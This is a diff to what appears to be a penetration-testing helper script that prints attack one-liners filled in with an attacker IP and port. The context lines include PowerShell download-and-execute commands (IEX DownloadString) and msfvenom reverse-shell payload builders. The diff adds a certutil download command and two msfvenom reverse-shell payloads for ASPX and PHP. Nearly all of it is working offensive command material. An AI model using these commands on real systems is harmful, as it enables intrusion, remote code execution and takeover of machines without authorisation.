@@ -101,6 +101,7 @@ case $3 in
 		 	echo -e "=======$BRed Windows $BWhite=============================================$BWhite"
 		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.exe','C:\destination\path\\\file.exe')\"$BWhite"
 		 	echo -e "[$BGreen Powershell $BWhite] :$BBlue powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.ps1')$BWhite"
+			echo -e "[$BGreen Certutil $BWhite] :$BBlue certutil -urlcache -f http://$BYellow$1$BBlue:$BYellow$2$BBlue/file.ps1 file.ps1 $BWhite" 
 		 	echo -e "-----------------------------------------------------------"
 		 	echo -e "[$BGreen FTP $BWhite]"
 		 	echo -e "$BPurple Setup FTP Server On Attacker Machine$BWhite"
@@ -153,6 +154,8 @@ function venom()
 		 	echo -e "[$BGreen JSP $BWhite]  : $BBlue msfvenom -p java/jsp_shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f raw > shell.jsp$BWhite"
 		 	echo -e "[$BGreen WAR $BWhite]  : $BBlue msfvenom -p java/jsp_shell_reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f war > shell.war$BWhite"
 		 	echo -e "[$BGreen ASPX $BWhite] : $BBlue msfvenom -p windows/meterpreter/reverse_tcp LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -f aspx >reverse.aspx$BWhite"
+			echo -e "[$BGreen ASPX (netcat shell) $BWhite] : $BBlue msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -o reverse-shell.aspx$BWhite"
+		 	echo -e "[$BGreen PHP (netcat shell) $BWhite] : $BBlue msfvenom -p windows/shell_reverse_tcp -f php LHOST=$BYellow$1$BBlue LPORT=$BYellow$2$BBlue -o reverse-shell.php$BWhite" 
 		 	echo -e "==========================================================="
 		;;
 		*)
